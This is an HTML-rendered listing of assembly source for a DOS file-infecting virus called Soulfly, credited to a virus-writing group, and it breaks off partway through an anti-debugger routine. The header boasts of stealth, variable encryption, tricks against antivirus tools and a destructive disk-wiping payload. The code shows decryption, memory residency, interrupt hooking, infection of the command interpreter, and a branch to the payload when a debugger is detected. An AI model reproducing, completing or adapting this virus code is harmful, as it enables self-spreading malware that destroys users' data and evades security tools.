<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Soulfly.2000 - SOULFLY.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     NAME: Soulfly v1.00</span><span class="sc0">
</span><span class="sc1">;     TYPE: Full-stealth variable encrypting .COM &amp; .EXE-infector.</span><span class="sc0">
</span><span class="sc1">;     SIZE: 2000 bytes.</span><span class="sc0">
</span><span class="sc1">;       OS: DOS.</span><span class="sc0">
</span><span class="sc1">;      CPU: 286+</span><span class="sc0">
</span><span class="sc1">;   AUTHOR: T-2000 / [Immortal Riot].</span><span class="sc0">
</span><span class="sc1">;   E-MAIL: T2000_@hotmail.com</span><span class="sc0">
</span><span class="sc1">;     DATE: December 1998 - January 1999.</span><span class="sc0">
</span><span class="sc1">;  PAYLOAD: But ofcourse, disktrashing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       - Full-stealth (network/Win95 compatible).</span><span class="sc0">
</span><span class="sc1">;       - Variable encrypted in files (including hostbytes).</span><span class="sc0">
</span><span class="sc1">;       - Disables stealth during execution archivers/disktools.</span><span class="sc0">
</span><span class="sc1">;       - Goes resident in UMB-area if available.</span><span class="sc0">
</span><span class="sc1">;       - Infects files pointed to COMSPEC and WINDIR-variables.</span><span class="sc0">
</span><span class="sc1">;       - Anti-debugger/tracer/disassembler/emulator tricks.</span><span class="sc0">
</span><span class="sc1">;       - Passes sanity-checks.</span><span class="sc0">
</span><span class="sc1">;       - Highly destructive payload, no sector is safe.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        "I'LL MAKE YOU BLEED AND YOU'RE BLEEDING NOW!! MUTHAFUCKA!!"</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">


                </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">TINY</span><span class="sc0">
                </span><span class="sc9">.STACK</span><span class="sc0">  </span><span class="sc5">Virus_Stack</span><span class="sc0">
                </span><span class="sc2">.286</span><span class="sc0">
                </span><span class="sc9">.CODE</span><span class="sc0">


</span><span class="sc5">Virus_Stack</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1024</span><span class="sc0">
</span><span class="sc5">Virus_Size</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Virus_End</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Virus_Size_Mem</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc5">Virus_End_Mem</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">Res_Check_AX</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0DB66h</span><span class="sc0">
</span><span class="sc5">Res_Check_BX</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">83FBh</span><span class="sc0">
</span><span class="sc5">Marker_Mem_AX</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1112h</span><span class="sc0">
</span><span class="sc5">Marker_Mem_BX</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1EE7h</span><span class="sc0">
</span><span class="sc5">Marker_File</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">9AEAh</span><span class="sc0">
</span><span class="sc5">Century</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">100</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">Encrypted_Size</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">End_Encrypted</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Encrypted</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">                      </span><span class="sc1">; Save PSP of our host.</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Delta</span><span class="sc0">

</span><span class="sc5">Anti_Disasm</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">

</span><span class="sc5">Get_Delta</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">                      </span><span class="sc1">; Use a segment-register so</span><span class="sc0">
                                                </span><span class="sc1">; F-Prot won't yell.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Anti_Disasm</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; Initial decryption-key.</span><span class="sc0">
</span><span class="sc5">Init_Key</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">End_Encrypted</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Encrypted_Size</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Decrypt_Word</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">             </span><span class="sc1">; Decrypt a word.</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; Next (previous) word.</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; Key-slider, to fuck X-Rays.</span><span class="sc0">
</span><span class="sc5">Slide_Key</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Loop_Decrypt</span><span class="sc0">            </span><span class="sc1">; Reload that prefetch-que!</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">9Ah</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">MOD</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">Loop_Decrypt</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Decrypt_Word</span><span class="sc0">

</span><span class="sc5">Encrypted</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Anti_Debugger</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                  </span><span class="sc1">; Zero DI.</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Do_Res_Check</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">

</span><span class="sc5">Do_Res_Check</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Res_Check_AX</span><span class="sc0">        </span><span class="sc1">; Residency-check.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Res_Check_BX</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Marker_Mem_AX</span><span class="sc0">       </span><span class="sc1">; We're already up there?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Make_Virus_TSR</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Marker_Mem_BX</span><span class="sc0">       </span><span class="sc1">; Double-check.</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Make_Virus_TSR</span><span class="sc0">

</span><span class="sc5">JMP_Exec_Host</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exec_Host</span><span class="sc0">

</span><span class="sc5">Make_Virus_TSR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5802h</span><span class="sc0">               </span><span class="sc1">; Get UMB link state.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Try_Alloc_Mem</span><span class="sc0">

                </span><span class="sc6">CBW</span><span class="sc0">                             </span><span class="sc1">; Save link state on stack.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5803h</span><span class="sc0">               </span><span class="sc1">; Link UMB-chain.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Try_Alloc_Mem</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5800h</span><span class="sc0">               </span><span class="sc1">; Get allocation strategy.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Try_Alloc_Mem</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Save strategy on stack.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5801h</span><span class="sc0">               </span><span class="sc1">; Set allocation strategy,</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; First fit, start with UMBs.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Try_Alloc_Mem</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

</span><span class="sc5">Try_Alloc_Mem</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">                 </span><span class="sc1">; Try to allocate memory...</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size_Mem</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">Copy_Virus_Up</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">                 </span><span class="sc1">; Get total size of block.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">                 </span><span class="sc1">; Resize block, so there's</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size_Mem</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; room for the virus.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Try_Alloc_Mem</span><span class="sc0">

</span><span class="sc5">Trash_Text</span><span class="sc0">      </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'SOULFLY, FLY FREE!'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc5">Copy_Virus_Up</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Our allocated block.</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; MCB of allocated block.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">DI.MCB_PSP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">       </span><span class="sc1">; Block doesn't have a PSP.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">DI.MCB_Program</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'CS'</span><span class="sc0">  </span><span class="sc1">; Used by the system.</span><span class="sc0">

                </span><span class="sc6">JCXZ</span><span class="sc0">    </span><span class="sc5">Do_Copy_Up</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Restore_Link</span><span class="sc0">

</span><span class="sc5">Restore_Alloc</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Restore original allocation</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; strategy.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Restore_Link</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Restore UMB link state.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Do_Copy_Up</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Copy virus to allocated</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; segment.</span><span class="sc0">
                </span><span class="sc5">SEGCS</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSW</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Active_Switch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">JCXZ</span><span class="sc0">    </span><span class="sc5">Get_Int13h</span><span class="sc0">              </span><span class="sc1">; To confuse some analyzers.</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">9Ah</span><span class="sc0">

</span><span class="sc5">Get_Int13h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3513h</span><span class="sc0">               </span><span class="sc1">; Get address INT 13h for</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; payload-routine.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int13h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; Save it.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int13h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; Get address INT 21h.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; Save it.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">                 </span><span class="sc1">; Chain our own handler.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NewInt21h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Infect_ComSpec</span><span class="sc0">

</span><span class="sc5">Exec_Host</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Host_Bytes</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Crypt_Header</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; PSP of current process.</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">CWD</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_4_EXE</span><span class="sc0">             </span><span class="sc1">; This host is a .EXE-file?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Exec_Host_EXE</span><span class="sc0">

</span><span class="sc5">Exec_Host_COM</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Restore original entry-</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">                      </span><span class="sc1">; bytes of our host.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSW</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">Exec_Host_EXE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">                  </span><span class="sc1">; Calculate effective</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                 </span><span class="sc1">; segment.</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Program_CS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SI.Program_SS</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SI.Program_SP</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SI.Program_IP</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">Anti_Debugger</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc0">                      </span><span class="sc1">; POP return-address.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">  </span><span class="sc1">; Debugger breakpoint?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Payload</span><span class="sc0">

                </span><span class="sc6">CLI</span><span class="sc0">                             </span><span class="sc1">; Stack-checker, to detect</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; debuggers and single-step</span><span class="sc0">
